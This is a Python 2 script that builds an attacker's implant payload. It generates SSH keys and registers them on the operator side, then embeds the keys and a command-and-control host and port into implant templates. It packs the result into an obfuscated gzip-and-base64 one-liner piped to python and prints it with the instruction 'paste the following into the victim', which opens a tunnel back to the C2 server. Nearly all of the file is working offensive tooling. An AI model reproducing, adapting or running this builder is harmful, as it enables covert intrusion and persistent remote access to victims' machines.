#!/usr/bin/env python

import os
import sys
import base64
import StringIO
import gzip
import re
import tempfile

logging = True

def usage():
    print "usage: %s <username> <victim_host> <c2_fqdn> <port>" % sys.argv[0]
    sys.exit(1)

def templify(template, replacements):
    out = template
    for k, v in replacements.iteritems():
        out = out.replace(k, v)
    return out

def getfile(path):
    with open(path, "r") as f:
        return f.read()
    return None

def nocomments(stuff):
    nc = re.sub('#.*$', '', stuff, 0, re.M)
    o = ""
    for l in nc.splitlines(True):
        if l.strip():
            if not logging and "log" in l:
                continue
            o += l
    return o

def gzbase(stuff):
    out = StringIO.StringIO()
    with gzip.GzipFile(fileobj=out, mode="wb") as f:
        f.write(nocomments(stuff))
    return base64.b64encode(out.getvalue())


def main():
    if len(sys.argv) < 5:
        usage()
    if os.getuid() != 0:
        sys.stderr.write("you must use sudo\n")
        sys.exit(1)

    username = sys.argv[1]
    victim_hostname = sys.argv[2]
    fqdn = sys.argv[3]
    port = sys.argv[4]

    print "[*] username: %s" % username
    print "[*] victim host: %s" % victim_hostname
    print "[*] fqdn: %s" % fqdn
    print "[*] port: %s" % port

    SCRIPT_TEMPLATE = getfile(os.path.join(sys.path[0], "install_implant.py"))
    KEYPATH = "/opt/backflips/keys/%s-%s-%s" % (username, victim_hostname, fqdn)
    print "[*] keypath: %s" % KEYPATH
    print "[*] generating keypair"
    os.system("ssh-keygen -t rsa -b 2048 -C '' -q -f '%s' -N ''" % KEYPATH)
    print "[*] adding to flip's authorized keys"
    os.system("cat '%s.pub' >> /opt/backflips/authorized_keys" % KEYPATH)


    pubkey = base64.b64encode(getfile(KEYPATH + ".pub"))
    privkey = base64.b64encode(getfile(KEYPATH))
    implant_py = getfile(os.path.join(sys.path[0], "implant.py"))
    implant = templify(implant_py, {
        "PORT_PLACEHOLDER" : port,
        "FQDN_PLACEHOLDER" : fqdn
        })

    replacements = {
        "PRIVATE_KEY_PLACEHOLDER" : privkey,
        "PUBLIC_KEY_PLACEHOLDER" : pubkey,
        "PORT_PLACEHOLDER" : port,
        "FQDN_PLACEHOLDER" : fqdn,
        "IMPLANT_PLACEHOLDER" : gzbase(implant)
        }

    SCRIPT = templify(SCRIPT_TEMPLATE, replacements)
    gzbased = gzbase(SCRIPT)
    cmd = "echo '%s'|base64 -d|gzip -d|python" % gzbased
    print "[+] paste the following into the victim"
    print cmd
    f = tempfile.NamedTemporaryFile(delete=False)
    f.write(cmd)
    print "[+] This is also available to you in the file %s" % f.name
    print "[*] Once this tunnel is up run: install_proxy.py %s PROXYPORT %s" % (port, KEYPATH)


if __name__ == "__main__":
    main()

#
# Editor modelines  -  https://www.wireshark.org/tools/modelines.html
#
# Local variables:
# c-basic-offset: 4
# indent-tabs-mode: nil
# End:
#
# vi: set shiftwidth=4 expandtab:
# :indentSize=4:noTabs=true:
#
